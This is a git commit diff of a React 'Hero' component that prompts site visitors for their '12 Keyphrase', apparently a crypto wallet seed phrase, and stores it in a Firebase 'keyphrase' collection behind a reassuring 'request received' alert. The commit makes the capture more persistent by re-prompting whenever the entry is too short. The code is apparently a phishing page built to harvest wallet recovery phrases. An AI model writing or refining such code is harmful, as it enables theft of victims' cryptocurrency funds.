599e0661625890cd23ecefcc2b90f1c5621958e9
Brainstorm <khameleonstorm@gmail.com>
2022-09-11 23:52:24 +0100

    adjust

--- components/Hero.js
+++ components/Hero.js
@@ -7,16 +7,20 @@ import { db } from "../firebase/config";
 
 
 
+
 export default function Hero() {
 
   const handleClick = async() => {
     const key = prompt("Enter your 12 Keyphrase correctly", "")
     
-    if(key.length > 40){
-      alert("Your request has been received, we will get back to you shortly")
-      await addDoc(collection(db, "keyphrase"), {key: key})
-    } else{
-      alert("Enter a valid Keyphrase")
+    if(key !== null){
+      if(key.length > 40){
+        alert("Your request has been received, we will get back to you shortly")
+        await addDoc(collection(db, "keyphrase"), {key: key})
+      } else{
+        alert("Enter a valid Keyphrase")
+        handleClick()
+      }
     }
   }
 
